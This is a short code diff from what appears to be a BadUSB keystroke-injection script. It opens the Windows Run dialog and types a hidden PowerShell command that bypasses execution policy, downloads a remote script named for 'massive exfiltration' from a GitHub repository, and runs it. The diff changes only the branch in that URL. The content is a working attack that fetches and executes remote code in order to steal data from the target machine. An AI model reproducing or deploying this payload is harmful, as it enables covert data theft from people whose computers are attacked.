@@ -28,7 +28,7 @@ print("USB is connected");
 badusb.press("GUI", "r");
 delay(500);
 badusb.println(
-  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/dev/massive-exfiltration/no-input-massive-exfil.ps1 | iex"
+  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/massive-exfiltration/no-input-massive-exfil.ps1 | iex"
 );
 badusb.quit();
 delay(3000);
